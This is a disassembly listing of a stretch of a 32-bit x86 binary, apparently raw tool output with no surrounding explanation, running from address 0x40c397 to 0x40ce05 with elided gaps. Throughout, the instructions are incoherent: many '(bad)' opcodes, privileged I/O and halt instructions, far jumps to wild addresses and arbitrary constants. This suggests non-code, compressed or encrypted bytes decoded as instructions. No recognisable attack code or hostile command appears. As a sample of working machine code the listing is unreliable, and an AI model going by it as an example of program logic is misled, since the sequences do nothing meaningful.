  40c397:	pop    ecx
  40c398:	jmp    0x312219a0
  40c39d:	lds    edi,FWORD PTR [ecx-0x59ebec28]
  40c3a3:	(bad)  
  40c3a4:	aas    
  40c3a5:	xor    ebp,DWORD PTR [ecx-0x4cab9dd6]
  40c3ab:	fnstsw WORD PTR [ebx+edi*1-0x67]
  40c3af:	xlat   BYTE PTR ds:[ebx]
  40c3b0:	sbb    dh,dl
  40c3b2:	cdq    
  40c3b3:	(bad)  
  40c3b4:	(bad)  
  40c3b5:	aas    
  40c3b6:	dec    ebp
  40c3b7:	fmul   DWORD PTR [eax-0x12fb59c]
  40c3bd:	pop    dx
  40c3bf:	sbb    eax,0x452d5ea6
  40c3c4:	add    cl,al
  40c3c6:	icebp  
  40c3c7:	xor    al,0x41
  40c3c9:	jmp    0x3f30d1fa
  40c3ce:	or     eax,0x51b4fed8
  40c3d3:	mov    edi,0x8044
	...
  40c400:	or     eax,0x166488d8
  40c405:	sar    dh,1
  40c407:	es fcom st(6)
  40c40a:	sub    WORD PTR [eax],ax
  40c40d:	sbb    al,0x0
  40c40f:	push   ss
  40c410:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c411:	retf   
  40c412:	test   BYTE PTR [esi],0x6d
  40c415:	(bad)  
  40c416:	je     0x40c40d
  40c418:	xor    eax,0x4cfea981
  40c41d:	in     al,0x84
  40c41f:	or     DWORD PTR [ebp-0x2a],eax
  40c422:	inc    BYTE PTR [ebx+0x439e433d]
  40c428:	add    edx,edi
  40c42a:	std    
  40c42b:	xchg   esp,eax
  40c42c:	sub    eax,0x2cd6fece
  40c431:	push   eax
  40c432:	or     al,0xc1
  40c434:	cmp    al,0x4
  40c436:	inc    esi
  40c438:	pop    edx
  40c439:	loopne 0x40c426
  40c43b:	mov    dh,0xc
  40c43d:	(bad)  
  40c43e:	imul   ebp,ecx,0x2859fea5
  40c444:	cmp    dl,dh
  40c446:	mov    ah,0x99
  40c448:	je     0x40c420
  40c44a:	(bad)  
  40c44b:	sahf   
  40c44c:	mul    BYTE PTR [edx-0x18]
  40c44f:	popf   
  40c450:	add    eax,0xb660fed6
  40c455:	ret    
  40c456:	test   BYTE PTR [eax],0xc0
  40c459:	mov    DWORD PTR [edx+0x0],ebp
  40c45c:	das    
  40c45d:	sbb    al,0x5a
  40c45f:	inc    ecx
  40c460:	xchg   edi,eax
  40c461:	mov    DWORD PTR [ebp+0xf0],esi
	...
  40c48b:	add    BYTE PTR [eax],al
  40c48d:	add    BYTE PTR [eax],cl
  40c48f:	mov    edi,edi
  40c491:	call   FWORD PTR [edx-0x3026192a]
  40c497:	mov    edi,edi
  40c499:	mov    edx,ebx
  40c49b:	and    eax,0xdcf0fff7
  40c4a0:	mov    esp,0xff8918e4
  40c4a5:	add    BYTE PTR [edx-0x8427e29],cl
  40c4ab:	nop
  40c4ac:	(bad)  
  40c4ad:	call   DWORD PTR [edi+0xe]
  40c4b0:	and    DWORD PTR fs:[edx+0x50fff776],0x5a
  40c4b8:	je     0x40c516
  40c4ba:	xchg   esp,eax
  40c4bb:	dec    ebx
  40c4bc:	call   0xc9f5b8
  40c4c1:	je     0x40c477
  40c4c3:	icebp  
  40c4c4:	(bad)  
  40c4c5:	inc    DWORD PTR [eax+0x4c]
  40c4c8:	push   DWORD PTR [ebp+0x1f]
  40c4cb:	jb     0x40c508
  40c4cd:	mov    ds:0xb5ff8c10,al
  40c4d2:	adc    edx,DWORD PTR [edi+edi*8+0x70e10ff]
  40c4d9:	call   0x40023e
  40c4de:	lock dec ebp
  40c4e0:	call   0xffccc5dc
  40c4e5:	jne    0x40c4b6
  40c4e7:	jno    0x40c46a
  40c4e9:	mov    ds:0xb5ff8b90,al
  40c4ee:	sti    
  40c4ef:	xchg   ebx,eax
  40c4f0:	(bad)  
  40c4f1:	inc    DWORD PTR [eax]
	...
  40c51b:	add    al,ah
  40c51d:	or     eax,0x3d54e807
  40c522:	(bad)  
  40c523:	(bad)  
  40c524:	ds in  eax,dx
  40c526:	jbe    0x40c508
  40c528:	test   eax,0x13ff30e4
  40c52d:	int3   
  40c52e:	sbb    ah,BYTE PTR [ebp-0x24]
  40c531:	push   esp
  40c532:	xor    edi,edi
  40c534:	shr    edi,cl
  40c536:	cmp    bh,bh
  40c538:	add    DWORD PTR [edi+esi*4+0x7],0xff651466
  40c540:	jno    0x40c576
  40c542:	ja     0x40c528
  40c544:	jno    0x40c572
  40c546:	xor    eax,ebp
  40c548:	daa    
  40c549:	fbstp  TBYTE PTR [eax]
  40c54b:	call   FWORD PTR [ecx+0x56]
  40c54e:	and    al,0xf7
  40c550:	push   ecx
  40c551:	xchg   esp,eax
  40c552:	sbb    al,0x2e
  40c554:	mov    ds:0x8bff318c,eax
  40c559:	xchg   edi,eax
  40c55a:	cmp    edi,edi
  40c55c:	cmp    DWORD PTR [ebx-0x1b],ebp
  40c55f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c560:	xor    DWORD PTR [esi+0x31],esi
  40c563:	mov    ch,0x16
  40c565:	jbe    0x40c598
  40c567:	call   DWORD PTR [esi]
  40c569:	retf   
  40c56a:	call   FWORD PTR gs:[ecx]
  40c56d:	pop    esi
  40c56e:	ja     0x40c54c
  40c570:	or     esi,edx
  40c572:	das    
  40c573:	call   0xff71ecb3
  40c578:	add    DWORD PTR [eax-0x420608cc],edx
  40c57e:	das    
  40c57f:	jne    0x40c581
	...
  40c5a9:	add    BYTE PTR [edx-0x4b],al
  40c5ac:	mov    ch,0x7
  40c5ae:	(bad)  
  40c5af:	outs   dx,DWORD PTR ds:[esi]
  40c5b0:	xor    bh,bh
  40c5b2:	loope  0x40c559
  40c5b4:	jne    0x40c5a6
  40c5b6:	rcr    DWORD PTR [ebp-0x213017d1],1
  40c5bc:	das    
  40c5bd:	dec    ecx
  40c5bf:	xchg   DWORD PTR [ecx+ebp*8],ebp
  40c5c2:	outs   dx,DWORD PTR ds:[esi]
  40c5c3:	add    al,0x30
  40c5c5:	(bad)  
  40c5c6:	mov    ecx,0xa6301c5b
  40c5cb:	data16 js 0x40c5d1
  40c5ce:	mov    ds:0x2fa1ffaa,al
  40c5d4:	bound  ebx,QWORD PTR [edi]
  40c5d6:	mov    ebp,0x919d849f
  40c5db:	inc    edx
  40c5dc:	(bad)  
  40c5dd:	xor    BYTE PTR [ebx],dl
  40c5df:	arpl   WORD PTR [ecx+0x6dd4dc04],ax
  40c5e5:	jp     0x40c5ea
  40c5e7:	xlat   BYTE PTR ds:[ebx]
  40c5e8:	ror    BYTE PTR [ebp+0x14],1
  40c5eb:	sbb    ch,cl
  40c5ed:	xor    BYTE PTR [ebx],dh
  40c5ef:	add    DWORD PTR [ecx-0x2c2a9e3e],esp
  40c5f5:	sti    
  40c5f6:	popa   
  40c5f7:	int    0x43
  40c5f9:	xor    BYTE PTR [ecx+0x43],dl
  40c5fc:	and    ecx,ebp
  40c5fe:	(bad)  
  40c5ff:	pop    edx
  40c600:	rol    DWORD PTR ds:0x30695b3e,0xb3
  40c607:	arpl   WORD PTR [ecx],dx
  40c609:	daa    
  40c60a:	xor    edx,esp
  40c60c:	sbb    eax,0x30
	...
  40c635:	add    BYTE PTR [eax],al
  40c637:	add    BYTE PTR [ebx+0x39b615d7],dh
  40c63d:	ret    
  40c63e:	mul    BYTE PTR [ebp+0x19]
  40c641:	aam    0x2f
  40c643:	inc    ebp
  40c644:	cmp    bl,BYTE PTR [ebx-0x6c]
  40c647:	jl     0x40c663
  40c649:	fisubr DWORD PTR [edi+ebx*1]
  40c64c:	or     esp,edx
  40c64e:	in     eax,dx
  40c64f:	jge    0x40c5d4
  40c651:	xlat   BYTE PTR ds:[ebx]
  40c652:	cmp    BYTE PTR [edi],ch
  40c654:	imul   ebp,DWORD PTR [ebx-0x22],0xffffffb9
  40c658:	xor    eax,0x3e9486c3
  40c65d:	pop    ebx
  40c65e:	loop   0x40c6a3
  40c660:	dec    ecx
  40c661:	fidiv  WORD PTR [ebp+0x4]
  40c664:	ds pop ebx
  40c666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c667:	leave  
  40c668:	rcr    DWORD PTR [edx+0x0],1
  40c66b:	jmp    0x250821ad
  40c670:	jbe    0x40c646
  40c672:	push   es
  40c673:	jmp    0x134107b5
  40c678:	inc    edx
  40c679:	inc    ecx
  40c67a:	add    BYTE PTR [ebx],al
  40c67c:	cmp    ah,dh
  40c67e:	inc    esp
  40c67f:	xchg   ebp,eax
  40c680:	jb     0x40c668
  40c682:	test   BYTE PTR [ebp+0x49],bh
  40c685:	aam    0xfe
  40c687:	sbb    DWORD PTR [ecx+0x4e],ebx
  40c68a:	clc    
  40c68b:	jbe    0x40c654
  40c68d:	iret   
  40c68e:	out    0x4f,eax
  40c690:	rcr    BYTE PTR [edx+0x0],cl
  40c693:	repnz std 
  40c695:	dec    esi
  40c696:	add    dl,BYTE PTR [edx-0x79]
  40c699:	out    0x84,al
  40c69b:	inc    ebp
	...
  40c6c4:	add    BYTE PTR [eax],al
  40c6c6:	sub    esp,edx
  40c6c8:	(bad)  
  40c6c9:	mov    ecx,0x3ef3ddbe
  40c6ce:	and    esp,edx
  40c6d0:	dec    edi
  40c6d1:	xchg   DWORD PTR ds:[ebx-0x1],esp
  40c6d5:	mov    esp,0x8640bb41
  40c6da:	imul   edx,edx,0xca6a6c88
  40c6e0:	(bad)  
  40c6e1:	push   ds
  40c6e2:	and    eax,0xbccb7413
  40c6e7:	adc    ah,ch
  40c6e9:	push   ss
  40c6ea:	imul   edx,edx,0x43427cff
  40c6f0:	add    cl,ch
  40c6f2:	sub    BYTE PTR [ecx],dl
  40c6f4:	(bad)  
  40c6f5:	cmp    al,0x5e
  40c6f7:	retf   0xeefe
  40c6fa:	sub    BYTE PTR [eax],cl
  40c6fc:	lock fisub WORD PTR [eax]
  40c6ff:	sar    dh,cl
  40c701:	push   esp
  40c702:	jmp    0xfed2:0x10a0b4ba
  40c709:	xchg   esp,eax
  40c70a:	or     eax,0xf800feca
  40c70f:	jbe    0x40c703
  40c711:	mov    ds:0x45ff8188,eax
  40c716:	(bad)  
  40c717:	jne    0x40c699
  40c719:	push   DWORD PTR [edx-0x75]
  40c71c:	call   0x9efe32
  40c721:	leave  
  40c722:	aad    0xd2
  40c724:	(bad)  
  40c725:	push   esp
  40c726:	sbb    al,0x72
  40c728:	add    esp,0x0
	...
  40c753:	add    bl,cl
  40c755:	hlt    
  40c756:	(bad)  
  40c757:	imul   ebx,DWORD PTR [edi-0x50f78a7f],0x8ffa159
  40c761:	dec    edi
  40c762:	inc    ebp
  40c763:	cld    
  40c764:	aas    
  40c765:	sbb    BYTE PTR [edx+0x41],0x67
  40c769:	xor    DWORD PTR ds:0xfe97afaa,0xe6d682fe
  40c773:	and    eax,0x68ff8108
  40c778:	clc    
  40c779:	mov    ds:0x5c6f003f,eax
  40c77e:	add    BYTE PTR [eax],al
  40c780:	xlat   BYTE PTR ds:[ebx]
  40c781:	xor    BYTE PTR [ebp+0x8],0x7f
  40c785:	ins    DWORD PTR es:[edi],dx
  40c786:	(bad)  
  40c787:	call   FWORD PTR [eax-0xa]
  40c78a:	push   ss
  40c78b:	pop    ebx
  40c78c:	(bad)  
  40c78d:	pop    ebp
  40c78e:	push   DWORD PTR ds:0x40167d
  40c794:	dec    eax
  40c795:	adc    eax,DWORD PTR [edi]
  40c797:	call   0x4048c3
  40c79c:	scas   eax,DWORD PTR es:[edi]
  40c79d:	gs pop ebx
  40c79f:	inc    ecx
  40c7a0:	pop    ss
  40c7a1:	test   BYTE PTR [eax],0x0
  40c7a4:	out    0xdd,eax
  40c7a6:	(bad)  
  40c7a7:	jne    0x40c798
  40c7a9:	jne    0x40c799
  40c7ab:	dec    BYTE PTR [eax]
  40c7ad:	cmp    bh,0x75
  40c7b0:	ds test al,0x2c
  40c7b3:	jne    0x40c7fb
  40c7b5:	pushf  
  40c7b6:	mov    al,ss:0x0
	...
  40c7e0:	add    BYTE PTR [eax],al
  40c7e2:	rcr    DWORD PTR [eax-0x3bbd3dc6],1
  40c7e8:	aad    0x8a
  40c7ea:	ror    BYTE PTR [eax],cl
  40c7ec:	mov    bh,0xb
  40c7ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7ef:	add    esp,DWORD PTR [ebp-0x1]
  40c7f2:	mov    cl,0xcc
  40c7f4:	inc    edx
  40c7f5:	je     0x40c7ef
  40c7f7:	imul   edx,ebx,0x5a
  40c7fa:	inc    ebx
  40c7fc:	shl    bh,cl
  40c7fe:	or     bl,BYTE PTR [ecx]
  40c800:	sub    eax,0xd473eeff
  40c805:	les    ebx,FWORD PTR ds:[bp+di]
  40c809:	mov    esi,0x40c80d16
  40c80e:	ds je  0x40c83e
  40c811:	jne    0x40c859
  40c813:	sub    al,0xf7
  40c815:	retf   
  40c816:	imul   esi,DWORD PTR [eax],0xc43f67cc
  40c81c:	sbb    edi,DWORD PTR [esi+0x40c803e6]
  40c822:	ds hlt 
  40c824:	sub    esi,DWORD PTR [ebp+0x36]
  40c827:	sub    al,0xe3
  40c829:	retf   
  40c82a:	inc    ecx
  40c82b:	mov    ah,cl
  40c82d:	addr16 cmp al,0xc2
  40c830:	sbb    edi,DWORD PTR [esi+0x40c7ffa6]
  40c836:	adc    ch,BYTE PTR ds:[esi*2-0x3400a5ca]
  40c83e:	sbb    DWORD PTR [edx+0x1c],esp
  40c841:	push   ss
  40c842:	fstp   QWORD PTR [ecx+0x2d]
  40c845:	leave  
	...
  40c86e:	add    BYTE PTR [eax],al
  40c870:	cld    
  40c871:	retf   0x5502
  40c874:	mov    ch,0x56
  40c876:	add    esp,0x6a02dcfa
  40c87c:	push   edi
  40c87d:	pop    ebx
  40c87e:	out    0xb6,al
  40c880:	inc    ecx
  40c881:	ret    
  40c882:	and    BYTE PTR [ecx+eiz*8-0x30],ah
  40c886:	pop    edi
  40c887:	(bad)  
  40c888:	aad    0x45
  40c88a:	repz sub al,0x4b
  40c88d:	arpl   cx,dx
  40c88f:	or     ecx,0xffffffd0
  40c892:	mov    ebp,0x3bd01c99
  40c897:	cld    
  40c898:	mov    eax,ds:0xb12cae49
  40c89d:	inc    ebp
  40c89e:	add    eax,0x9163332d
  40c8a3:	lahf   
  40c8a4:	mov    al,ds:0x132c95d0
  40c8a9:	iret   
  40c8aa:	lea    esi,[esi+0x641ac339]
  40c8b0:	mov    eax,edx
  40c8b2:	scas   eax,DWORD PTR es:[edi]
  40c8b3:	inc    ecx
  40c8b4:	cmp    bl,BYTE PTR [ebx+0x1c]
  40c8b7:	jns    0x40c923
  40c8b9:	fsub   QWORD PTR [edi+ebp*1+0x1bf54671]
  40c8c0:	inc    esp
  40c8c1:	clc    
  40c8c2:	pop    ebp
  40c8c3:	sub    al,0x35
  40c8c5:	fwait
  40c8c6:	in     eax,0x87
  40c8c8:	popf   
  40c8c9:	pop    ebx
  40c8ca:	jmp    0x45578fd2
  40c8cf:	or     bl,0x6a
  40c8d2:	jmp    0x40c98e
	...
  40c8fb:	add    BYTE PTR [eax],al
  40c8fd:	add    BYTE PTR [ebx],dh
  40c8ff:	sar    BYTE PTR [ebx+0x2d463913],1
  40c905:	sbb    edx,edi
  40c907:	clc    
  40c908:	and    eax,0x1d15b72c
  40c90d:	fwait
  40c90e:	xchg   ebp,eax
  40c90f:	xor    al,0xa8
  40c911:	add    ebx,DWORD PTR [ecx]
  40c913:	inc    esi
  40c914:	or     eax,0x5f94b1b
  40c919:	sub    al,0x6e
  40c91b:	inc    ebx
  40c91c:	jmp    0x51da24
  40c921:	cdq    
  40c922:	sub    al,BYTE PTR [esi+0x8]
  40c925:	add    ecx,ecx
  40c927:	mov    ds:0xdd4ae6fe,al
  40c92c:	mov    eax,ds:0x9a4315de
  40c931:	xor    al,BYTE PTR [ebx]
  40c933:	sar    ch,1
  40c935:	push   esp
  40c936:	es ret 
  40c938:	adc    ecx,DWORD PTR [edi+0x514fd015]
  40c93e:	cmp    ebx,DWORD PTR [ebx-0x11]
  40c941:	ja     0x40c8d5
  40c943:	shl    BYTE PTR [ecx+eiz*8+0x55],1
  40c947:	dec    esp
  40c948:	enter  0x55a6,0xc3
  40c94c:	pusha  
  40c94d:	dec    ebx
  40c94e:	push   ebp
  40c94f:	shl    BYTE PTR [edi+0x69],1
  40c952:	mov    DWORD PTR [edx],ebx
  40c954:	add    BYTE PTR [esi+0x7ae7d3cf],cl
  40c95a:	pop    ds
  40c95b:	sar    dh,1
  40c95d:	sbb    DWORD PTR [edx+0x86fecf],esp
	...
  40c98b:	add    ah,ah
  40c98d:	sub    bh,bh
  40c98f:	hlt    
  40c990:	jne    0x40c949
  40c992:	push   ecx
  40c993:	xor    DWORD PTR ds:0xdba9e7d0,edx
  40c999:	iret   
  40c99a:	inc    cl
  40c99c:	shl    BYTE PTR [ebx],cl
  40c99e:	inc    ecx
  40c99f:	jmp    0x523d0fc8
  40c9a4:	lock cmc 
  40c9a6:	(bad)  
  40c9a7:	ds push 0x37
  40c9aa:	add    ecx,ebp
  40c9ac:	push   esp
  40c9ad:	or     eax,0x56ef2e50
  40c9b2:	call   0xff0f2f8f
  40c9b7:	adc    DWORD PTR ds:0x6516fef9,esi
  40c9bd:	dec    eax
  40c9be:	cld    
  40c9bf:	add    DWORD PTR ds:0x4000fef9,ebp
  40c9c5:	nop
  40c9c6:	ret    0x170c
  40c9c9:	lods   al,BYTE PTR ds:[esi]
  40c9ca:	mov    esp,ebp
  40c9cc:	fs sbb edi,esp
  40c9cf:	push   0xffffffe7
  40c9d1:	lock sbb bh,bh
  40c9d4:	mov    cl,bh
  40c9d6:	out    0x39,al
  40c9d8:	pusha  
  40c9d9:	cmp    edi,0x6a832a89
  40c9df:	add    BYTE PTR [ebp+0x5d],bh
  40c9e2:	push   DWORD PTR [ebp-0x31]
  40c9e5:	jb     0x40ca09
  40c9e7:	inc    DWORD PTR [eax-0x2ff957f]
  40c9ed:	mov    ch,0xfd
  40c9ef:	jne    0x40c9f1
	...
  40ca19:	add    BYTE PTR [edi-0x1f00e98e],bl
  40ca1f:	sub    DWORD PTR [edx+0x0],0x75ff634d
  40ca26:	lahf   
  40ca27:	jb     0x40ca33
  40ca29:	inc    eax
  40ca2b:	sub    DWORD PTR [eax-0x32],0x69fe985c
  40ca32:	popf   
  40ca33:	xor    DWORD PTR [ebp+0x8],0xfffe7dbf
  40ca3a:	loopne 0x40ca2d
  40ca3c:	int3   
  40ca3d:	pop    ebx
  40ca3e:	xchg   esi,eax
  40ca3f:	pop    edx
  40ca40:	push   0x23
  40ca42:	add    BYTE PTR [ebx],cl
  40ca44:	pop    es
  40ca45:	call   0x404e4d
  40ca4a:	jg     0x40c9e0
  40ca4c:	pop    ebx
  40ca4d:	inc    ecx
  40ca4e:	push   edi
  40ca4f:	lock sbb bh,bh
  40ca52:	mov    dl,dl
  40ca54:	out    0xdd,al
  40ca56:	jno    0x40c9d9
  40ca58:	(bad)  
  40ca59:	(bad)  
  40ca5a:	jmp    0x2072:0x2f75ff75
  40ca61:	lahf   
  40ca62:	inc    eax
  40ca63:	or     ecx,0x2c03ec2
  40ca69:	push   ebp
  40ca6a:	(bad)
  40ca6d:	les    edx,FWORD PTR [esi]
  40ca6f:	int    0x28
  40ca71:	push   DWORD PTR [ebx-0x6afd90a]
  40ca77:	dec    esi
  40ca78:	adc    edi,edi
  40ca7a:	imul   esi,DWORD PTR [eax+0xb81a],0x0
	...
  40caa5:	add    BYTE PTR [eax],al
  40caa7:	add    BYTE PTR [ebx-0x1f4fd3d],bh
  40caad:	mov    esp,0xc43f477d
  40cab2:	add    al,bh
  40cab4:	jnp    0x40ca62
  40cab6:	add    eax,DWORD PTR [eax]
  40cab8:	les    edi,FWORD PTR ds:[edi]
  40cabb:	inc    ebp
  40cabc:	retf   0x10c
  40cabf:	add    BYTE PTR [esi],bh
  40cac1:	sbb    al,BYTE PTR [edx+ebp*2]
  40cac4:	sbb    al,BYTE PTR ds:[edx+ebp*2]
  40cac8:	ds inc edi
  40caca:	mov    edi,0x7f3f0ef3
  40cacf:	hlt    
  40cad0:	xchg   ecx,eax
  40cad1:	in     al,0x28
  40cad3:	push   eax
  40cad4:	xchg   ecx,eax
  40cad5:	data16 sub al,0xff
  40cad8:	adc    ebx,eax
  40cada:	sbb    ecx,DWORD PTR [edx+0xb02c3b3]
  40cae0:	jle    0x40cab1
  40cae2:	std    
  40cae3:	call   0x438e2c
  40cae8:	(bad)  
  40cae9:	cmp    eax,0x2d3e40bc
  40caee:	scas   eax,DWORD PTR es:[edi]
  40caef:	pcmpgtd mm1,QWORD PTR [eax+0x1351ff60]
  40caf6:	jl     0x40cac8
  40caf8:	mov    ebx,0x41f7303e
  40cafd:	mov    esp,ss
  40caff:	push   ecx
  40cb00:	es jp  0x40cb63
  40cb03:	push   DWORD PTR [ecx]
  40cb05:	cmp    al,0x7f
  40cb07:	lock xor DWORD PTR [esi+eiz*1+0x29],ebx
	...
  40cb34:	add    BYTE PTR [eax],al
  40cb36:	push   ss
  40cb37:	jnp    0x40cb81
  40cb39:	sub    DWORD PTR [ecx],ebx
  40cb3b:	inc    edx
  40cb3c:	jmp    0xa8702ddc
  40cb41:	add    ecx,DWORD PTR [ecx]
  40cb43:	pop    es
  40cb44:	stc    
  40cb45:	xor    BYTE PTR [ecx],al
  40cb47:	int    0xfd
  40cb49:	scas   al,BYTE PTR es:[edi]
  40cb4a:	inc    ebp
  40cb4b:	ret    
  40cb4c:	int3   
  40cb4d:	pop    edi
  40cb4e:	icebp  
  40cb4f:	int3   
  40cb50:	pop    edi
  40cb51:	jg     0x40cb2d
  40cb53:	(bad)  
  40cb54:	in     eax,0x28
  40cb56:	push   esp
  40cb57:	pop    ebx
  40cb58:	push   ecx
  40cb59:	jmp    0x40cbd0
  40cb5b:	sbb    ch,cl
  40cb5d:	sub    BYTE PTR [ebx-0x36d72a35],cl
  40cb63:	int3   
  40cb64:	cmp    edi,eax
  40cb66:	fldenv [edx-0x7b]
  40cb69:	sub    BYTE PTR [ecx-0x56e4941e],bh
  40cb6f:	int3   
  40cb70:	lods   eax,DWORD PTR ds:[esi]
  40cb71:	test   bl,ch
  40cb73:	mov    edi,0x5ba1289d
  40cb78:	adc    eax,0xe95b21f4
  40cb7d:	sbb    al,dl
  40cb7f:	inc    ebx
  40cb80:	xchg   esp,eax
  40cb81:	int3   
  40cb82:	(bad)  
  40cb83:	pop    edx
  40cb84:	xchg   BYTE PTR [esi-0x6e],ch
  40cb87:	les    edi,FWORD PTR [ebp+0x28]
  40cb8a:	jns    0x40cbd2
  40cb8c:	loope  0x40cba9
  40cb8e:	mov    dl,0xa2
  40cb90:	ins    DWORD PTR es:[edi],dx
  40cb91:	sub    dh,dl
  40cb93:	pop    ecx
  40cb94:	jmp    0x5e846bb1
  40cb99:	int3   
	...
  40cbc2:	add    BYTE PTR [eax],al
  40cbc4:	(bad)  
  40cbc5:	pop    edx
  40cbc6:	push   esi
  40cbc7:	outs   dx,BYTE PTR ds:[esi]
  40cbc8:	(bad)  
  40cbc9:	les    ecx,FWORD PTR [ebp+0x28]
  40cbcc:	dec    ecx
  40cbcd:	inc    esi
  40cbce:	icebp  
  40cbcf:	sbb    ebx,DWORD PTR [edx-0x42d7c25e]
  40cbd5:	or     eax,0xcc6e4100
  40cbda:	(bad)  
  40cbdb:	jmp    0xe9a947b9
  40cbe0:	cmp    eax,0x6891bdbc
  40cbe5:	xor    BYTE PTR [ecx-0x17],al
  40cbe8:	pushw  es
  40cbea:	call   0xff0d2205
  40cbef:	jl     0x40cbf6
  40cbf1:	mov    ah,0x82
  40cbf3:	xor    BYTE PTR [esi],ah
  40cbf5:	int3   
  40cbf6:	addr16 call 0x81fe8839
  40cbfc:	push   ss
  40cbfd:	xor    BYTE PTR [ecx-0x17],al
  40cc00:	sbb    BYTE PTR [esi],al
  40cc02:	call   0xff0ceddd
  40cc07:	pop    esp
  40cc08:	shl    BYTE PTR [ebx-0x33de5f96],cl
  40cc0e:	(bad)  
  40cc0f:	jl     0x40cc37
  40cc11:	(bad)  
  40cc12:	(bad)  
  40cc13:	mov    esi,0xb6a03d5a
  40cc18:	pop    ecx
  40cc19:	int3   
  40cc1a:	mov    ah,0xc1
  40cc1c:	pop    ecx
  40cc1d:	int3   
  40cc1e:	(bad)  
  40cc1f:	xchg   ecx,eax
  40cc20:	fucomp st(3)
  40cc22:	(bad)  
  40cc23:	sahf   
  40cc24:	popa   
  40cc25:	push   es
  40cc26:	lock sahf 
	...
  40cc50:	add    BYTE PTR [eax],al
  40cc52:	pop    ecx
  40cc53:	int3   
  40cc54:	(bad)  
  40cc55:	adc    al,0x86
  40cc57:	int3   
  40cc58:	je     0x40cc4b
  40cc5a:	and    eax,0x217efe07
  40cc5f:	int3   
  40cc60:	mov    ah,0x79
  40cc62:	and    esp,ecx
  40cc64:	inc    BYTE PTR [ecx+0x66feeba9]
  40cc6a:	sbb    DWORD PTR [esi],edx
  40cc6c:	clc    
  40cc6d:	push   eax
  40cc6e:	sbb    cl,ch
  40cc70:	(bad)  
  40cc71:	push   esi
  40cc72:	sbb    DWORD PTR [esi-0x4],eax
  40cc75:	inc    ecx
  40cc76:	popf   
  40cc77:	(bad)  
  40cc79:	call   DWORD PTR [edi-0x72]
  40cc7c:	ret    0x270c
  40cc7f:	lods   al,BYTE PTR ds:[esi]
  40cc80:	mov    esp,ebp
  40cc82:	push   0x97e80b0c
  40cc87:	cmp    edi,edi
  40cc89:	jmp    FWORD PTR [edi+ebx*1]
  40cc8c:	je     0x40ccc7
  40cc8e:	scas   eax,DWORD PTR es:[edi]
  40cc8f:	(bad)  
  40cc90:	pop    edx
  40cc91:	inc    ecx
  40cc92:	daa    
  40cc93:	scas   eax,DWORD PTR es:[edi]
  40cc94:	out    0xc,al
  40cc96:	add    DWORD PTR [edx-0x1958af01],0xfffffffe
  40cc9d:	dec    DWORD PTR [eax+0x41]
  40cca0:	push   0xfe9fccf5
  40cca5:	dec    edi
  40cca6:	fmul   DWORD PTR [ebx]
  40cca8:	pop    es
  40cca9:	call   0x4053af
  40ccae:	jg     0x40cc97
  40ccb0:	(bad)  
  40ccb1:	(bad)  
  40ccb2:	clc    
  40ccb3:	inc    eax
  40ccb4:	push   0xff
	...
  40ccdd:	add    BYTE PTR [eax],al
  40ccdf:	add    BYTE PTR [eax+eiz*4],cl
  40cce2:	dec    BYTE PTR [edi-0x8]
  40cce5:	or     eax,DWORD PTR [edi]
  40cce7:	call   0x405371
  40ccec:	jg     0x40cd53
  40ccee:	lahf   
  40ccef:	(bad)  
  40ccf0:	fadd   DWORD PTR [edi-0x5468f73e]
  40ccf6:	mov    esp,ebp
  40ccf8:	and    al,0x8a
  40ccfa:	cld    
  40ccfb:	push   esi
  40ccfc:	push   eax
  40ccfd:	in     eax,0xfe
  40ccff:	imul   ecx,DWORD PTR [ecx+eax*4-0x3a50f78b],0x46f8ff9b
  40cd0a:	inc    ebp
  40cd0b:	cld    
  40cd0c:	fmul   st(2),st
  40cd0e:	sub    al,0x48
  40cd10:	push   ss
  40cd11:	pop    edi
  40cd12:	mov    edi,DWORD PTR ds:0x400745
  40cd18:	out    0xc0,eax
  40cd1a:	dec    BYTE PTR [esi]
  40cd1c:	cmp    BYTE PTR ds:[edx+0x0],ch
  40cd20:	ds mov ah,0x9a
  40cd23:	jmp    0x5643c00d
  40cd28:	shl    BYTE PTR es:[esi+0x0],cl
  40cd2c:	ds mov ebp,0xf4787442
  40cd32:	cmp    BYTE PTR [eax],0x3e
  40cd35:	sar    DWORD PTR [esi-0x79],1
  40cd38:	ds mov ah,0x2
  40cd3b:	push   eax
  40cd3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd3d:	pop    esi
  40cd3e:	retf   0x3e40
  40cd41:	pop    esp
  40cd42:	cwde   
  40cd43:	mov    DWORD PTR [eax],eax
	...
  40cd6d:	add    BYTE PTR [esi],bh
  40cd6f:	mov    ah,0xc8
  40cd71:	add    bh,ah
  40cd73:	jecxz  0x40cd8f
  40cd75:	pusha  
  40cd76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd77:	shl    BYTE PTR [eax+edx*2],1
  40cd7a:	mov    ds,esp
  40cd7c:	add    al,BYTE PTR [eax]
  40cd7e:	rol    DWORD PTR [ecx],1
  40cd80:	pushf  
  40cd81:	hlt    
  40cd82:	jne    0x40cdf7
  40cd84:	add    al,0x50
  40cd86:	shl    DWORD PTR [esi],1
  40cd88:	cld    
  40cd89:	out    0x55,eax
  40cd8b:	cld    
  40cd8c:	and    al,0xff
  40cd8e:	data16 sub al,0x3
  40cd91:	add    BYTE PTR [ecx+0x15fe9c49],ch
  40cd97:	jae    0x40cd9d
  40cd99:	push   eax
  40cd9a:	test   eax,0x9e7fc8e
  40cd9f:	or     al,0x25
  40cda1:	jmp    DWORD PTR [esi-0x6e007aad]
  40cda7:	fadd   st(0),st
  40cda9:	addr16 pushf 
  40cdab:	mov    ebx,es
  40cdad:	(bad)  
  40cdae:	call   0x3ecc0a9e
  40cdb3:	mov    ah,0xf7
  40cdb5:	mov    edi,0xe7cd07ea
  40cdba:	inc    ebp
  40cdbb:	sbb    esp,DWORD PTR ds:0xb95b0eff
  40cdc1:	fwait
  40cdc2:	pop    ecx
  40cdc3:	leave  
  40cdc4:	dec    ebp
  40cdc5:	data16 out 0xcf,al
  40cdc8:	mov    cl,0xc2
  40cdca:	dec    ecx
  40cdcb:	sbb    DWORD PTR [esi-0x51],ecx
  40cdce:	cmp    DWORD PTR [ebx+0x3c0e],esi
	...
  40cdfc:	cmp    ecx,ecx
  40cdfe:	mov    al,ds:0x465b3e9b
  40ce03:	xchg   si,ax
  40ce05:	enter  0xc291,0x21
